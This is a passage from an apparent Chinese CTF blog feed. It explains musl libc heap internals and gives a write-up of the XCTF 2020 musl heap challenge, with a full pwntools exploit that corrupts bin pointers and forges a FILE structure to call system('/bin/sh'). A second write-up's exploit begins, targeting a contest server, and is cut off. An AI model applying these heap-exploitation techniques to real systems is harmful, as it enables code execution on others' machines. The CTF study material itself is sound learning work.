class="comment">// 3. 将 self 加入到 bin i 链表的尾部</span></span><br><span class="line">    self-&gt;next = BIN_TO_CHUNK(i);</span><br><span class="line">    self-&gt;prev = mal.bins[i].tail;</span><br><span class="line">    self-&gt;next-&gt;prev = self;</span><br><span class="line">    self-&gt;prev-&gt;next = self;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Replace middle of large chunks with fresh zero pages */</span></span><br><span class="line">    <span class="keyword">if</span> (reclaim) &#123;</span><br><span class="line">        [...]</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    unlock_bin(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>__bin_chunk函数的作用是将 chunk 插入到 bin 链表中。首先合并 chunk 前后的空闲 chunk、设置 binmap 和 chunk 标志位，最后将 chunk 插入到对应的 bin 链表中。</p><p>然后在musl当中的堆管理为了减少内存的使用会直接将libc和程序当中的空闲的内存当作堆内存，而glibc的堆地址一般都是位于内存中的动态内存区域。</p><h2 id="XCTF-2020-PWN-musl"><a href="#XCTF-2020-PWN-musl" class="headerlink" title="XCTF_2020_PWN_musl"></a>XCTF_2020_PWN_musl</h2><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220427153926579.png"                      alt="image-20220427153926579"                ></p><p>可以看到这里确实是直接在libc和process上面有堆的地址。</p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>就是很经典的菜单题，并且在create函数里面有一处只能运行一次的0x50的溢出，而且题目只有一处使用exit退出程序，然后show函数也只有一次。</p><h3 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h3><p>其实利用思路就很简单了，存在溢出，unbin又有如此大的安全隐患，所以就是通过溢出修改掉next指针和prev指针从而实现任意地址写，造成FSOP</p><p>这里说一下怎么造成的FSOP</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_Noreturn <span class="keyword">void</span> <span class="title">exit</span><span class="params">(<span class="keyword">int</span> code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__funcs_on_exit();</span><br><span class="line">__libc_exit_fini();</span><br><span class="line">__stdio_exit();</span><br><span class="line">_Exit(code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">close_file</span><span class="params">(FILE *f)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!f) <span class="keyword">return</span>;</span><br><span class="line">FFINALLOCK(f);</span><br><span class="line"><span class="keyword">if</span> (f-&gt;wpos != f-&gt;wbase) f-&gt;write(f, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (f-&gt;rpos != f-&gt;rend) f-&gt;seek(f, f-&gt;rpos-f-&gt;rend, SEEK_CUR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __stdio_exit(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">FILE *f;</span><br><span class="line"><span class="keyword">for</span> (f=*__ofl_lock(); f; f=f-&gt;next) close_file(f);</span><br><span class="line">close_file(__stdin_used);</span><br><span class="line">close_file(__stdout_used);</span><br><span class="line">close_file(__stderr_used);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到最后是有机会调用到file的内部函数指针的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> flags;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *rpos, *rend;</span><br><span class="line"><span class="keyword">int</span> (*close)(FILE *);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *wend, *wpos;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *mustbezero_1;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *wbase;</span><br><span class="line"><span class="keyword">size_t</span> (*read)(FILE *, <span class="keyword">unsigned</span> <span class="keyword">char</span> *, <span class="keyword">size_t</span>);</span><br><span class="line"><span class="keyword">size_t</span> (*write)(FILE *, <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *, <span class="keyword">size_t</span>);</span><br><span class="line"><span class="keyword">off_t</span> (*seek)(FILE *, <span class="keyword">off_t</span>, <span class="keyword">int</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *buf;</span><br><span class="line"><span class="keyword">size_t</span> buf_size;</span><br><span class="line">FILE *prev, *next;</span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"><span class="keyword">int</span> pipe_pid;</span><br><span class="line"><span class="keyword">long</span> lockcount;</span><br><span class="line"><span class="keyword">int</span> mode;</span><br><span class="line"><span class="keyword">volatile</span> <span class="keyword">int</span> lock;</span><br><span class="line"><span class="keyword">int</span> lbf;</span><br><span class="line"><span class="keyword">void</span> *cookie;</span><br><span class="line"><span class="keyword">off_t</span> off;</span><br><span class="line"><span class="keyword">char</span> *getln_buf;</span><br><span class="line"><span class="keyword">void</span> *mustbezero_2;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *shend;</span><br><span class="line"><span class="keyword">off_t</span> shlim, shcnt;</span><br><span class="line">FILE *prev_locked, *next_locked;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">locale_struct</span> *<span class="title">locale</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>所以我们需要利用exit来执行FSOP，不过难点就是怎么运行到exit，因为需要malloc返回一个0xdeadbeef，在上面可以看到，如果所有的bin都为空，此时malloc就会调用expand_heap来扩展堆，本质还是调用了__expand_heap函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *__expand_heap(<span class="keyword">size_t</span> *pn)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uintptr_t</span> brk;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">unsigned</span> mmap_step;</span><br><span class="line"><span class="keyword">size_t</span> n = *pn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (n &gt; SIZE_MAX/<span class="number">2</span> - PAGE_SIZE) &#123;</span><br><span class="line">errno = ENOMEM;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">n += -n &amp; PAGE_SIZE<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!brk) &#123;</span><br><span class="line">brk = __syscall(SYS_brk, <span class="number">0</span>);</span><br><span class="line">brk += -brk &amp; PAGE_SIZE<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (n &lt; SIZE_MAX-brk &amp;&amp; !traverses_stack_p(brk, brk+n)</span><br><span class="line">    &amp;&amp; __syscall(SYS_brk, brk+n)==brk+n) &#123;</span><br><span class="line">*pn = n;</span><br><span class="line">brk += n;</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">void</span> *)(brk-n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> min = (<span class="keyword">size_t</span>)PAGE_SIZE &lt;&lt; mmap_step/<span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span> (n &lt; min) n = min;</span><br><span class="line"><span class="keyword">void</span> *area = __mmap(<span class="number">0</span>, n, PROT_READ|PROT_WRITE,</span><br><span class="line">MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (area == MAP_FAILED) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">*pn = n;</span><br><span class="line">mmap_step++;</span><br><span class="line"><span class="keyword">return</span> area;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在__expand_heap函数中，brk是指向数据段末尾位置的指针。__expand_heap函数调用 brk 系统调用__syscall(SYS_brk, brk+n)，将数据段末尾向后延展n字节，然后延展部分返回给malloc作为新的 chunk 分配给用户</p><p>若程序不开启 PIE，数据段的地址长度为 24 bit（0~0x2000000），内存位置与0xBADBEEF比较接近。若将brk指针修改为0xBADBEEF - n，brk 系统调用就会把数据段延展至0xBADBEEF，使其成为可访问的内存地址。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./carbon&#x27;</span>)</span><br><span class="line"><span class="comment"># r = process([&#x27;./libc.so&#x27;, &#x27;carbon&#x27;])</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so&#x27;)</span></span><br><span class="line"><span class="comment"># r = process([&#x27;/ctf/work/download/libc.so&#x27;, &#x27;./carbon&#x27;])</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/ctf/work/download/libc.so&#x27;)</span></span><br><span class="line">r = process([<span class="string">&#x27;../../libc/libc1.1.24.so&#x27;</span>, <span class="string">&#x27;./carbon&#x27;</span>])</span><br><span class="line">libc = ELF(<span class="string">&#x27;../../libc/libc1.1.24.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">option</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(option), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size, believer, content</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;What is your prefer size? &gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(size), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Are you a believer? &gt;&#x27;</span>)</span><br><span class="line">    r.sendline(believer)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Say hello to your new sleeve &gt;&#x27;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;What is your sleeve ID? &gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;What is your sleeve ID? &gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;What is your sleeve ID? &gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">create(<span class="number">0x1</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(r.recvuntil(<span class="string">b&#x27;Done.&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x29de61</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base=&gt;&#x27;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line">bin_addr = libc_base + <span class="number">0x29de00</span> - <span class="number">0x8</span></span><br><span class="line">stdin_addr = libc_base + libc.symbols[<span class="string">&#x27;__stdin_FILE&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binmap_addr = libc_base + <span class="number">0x29da80</span></span><br><span class="line">brk_addr = libc_base + libc.symbols[<span class="string">&#x27;brk&#x27;</span>]</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 1</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 2</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 3</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 4</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 5</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 6</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 7</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 8</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>) + p64(<span class="number">0x20</span>) + p64(stdin_addr -</span><br><span class="line">                                       <span class="number">0x10</span>) + p64(stdin_addr -</span><br><span class="line">                                                   <span class="number">0x10</span>) + p8(<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;Y&#x27;</span>, payload + <span class="string">b&#x27;\n&#x27;</span>)  <span class="comment"># 1</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">3</span>, flat(stdin_addr - <span class="number">0x10</span>, bin_addr))</span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 5</span></span><br><span class="line">file_struct = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span></span><br><span class="line">file_struct += p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">1</span>) * <span class="number">2</span> + p64(system_addr)</span><br><span class="line">create(<span class="number">0x50</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;\n&#x27;</span>)  <span class="comment"># 9</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">3</span>, flat(brk_addr - <span class="number">0x10</span>, brk_addr - <span class="number">0x10</span>))</span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 7</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">3</span>, flat(binmap_addr - <span class="number">0x10</span>, binmap_addr - <span class="number">0x10</span>))</span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">3</span>, flat(binmap_addr - <span class="number">0x10</span>, bin_addr))</span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 7</span></span><br><span class="line">create(<span class="number">0x50</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;\n&#x27;</span>)  <span class="comment"># 10</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">3</span>, flat(brk_addr - <span class="number">0x10</span>, bin_addr))</span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 1</span></span><br><span class="line">create(<span class="number">0x50</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;\n&#x27;</span>)  <span class="comment"># 11</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">9</span>, file_struct)</span><br><span class="line">edit(<span class="number">11</span>, p64(<span class="number">0xbadbeef</span> - <span class="number">0x20</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">edit(<span class="number">10</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span> + p64(<span class="number">0</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&quot;&gt;&quot;</span>)</span><br><span class="line">r.sendlien(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;What is your prefer size? &gt;&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>然后就是我这里的libc是自己编译的和题目一直有出入，所以我这个exp可能不能直接用在题目上，同时我也问了其他师傅这个编译该怎么办，还在等回复~</p><hr><p>参考链接：<a class="link"   href="https://www.anquanke.com/post/id/202253%23h2-4#h3-14" >https://www.anquanke.com/post/id/202253%23h2-4#h3-14<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这个月干的是属实有点儿少，感觉特别迷茫，学了那么多结果比赛还是一头雾水，虽然很烦躁但是还是不能放弃啊！&lt;/p&gt;
&lt;p&gt;在starCTF的第二道题我始终找不到漏洞点在哪，下来看wp才发现使用的libc不是普通的glibc了，其实在RCTF的一道题目就是基于musl的但是无奈g</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="musl" scheme="https://cv196082.gitee.io/tags/musl/"/>
    
  </entry>
  
  <entry>
    <title>*CTF-examination</title>
    <link href="https://cv196082.gitee.io/2022/04/17/CTF-examination/"/>
    <id>https://cv196082.gitee.io/2022/04/17/CTF-examination/</id>
    <published>2022-04-17T02:16:33.000Z</published>
    <updated>2022-04-17T03:07:10.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="examination"><a href="#examination" class="headerlink" title="examination"></a>examination</h2><p>太菜了只做了第一道题，第二道题死活找不到漏洞点</p><h3 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h3><p>这道题的流程挺明确的，因为是c语言逆向起来比较简单这里就不再赘述逆向过程了。</p><p>总的来说程序就是下图所示的这个结构</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220416234427867.png"                      alt="image-20220416234427867"                ></p><p>首先就是程序存在一个可以让我们任意地址+1的函数，利用此函数造成UAF，进而泄漏出libc地址，随后继续利用UAF控制结构体的指向，进而控制tcache_struct最后使用house of pig的最后一步即可。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./examination&#x27;</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./examination&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;124.70.130.92&#x27;</span>, <span class="number">60001</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span 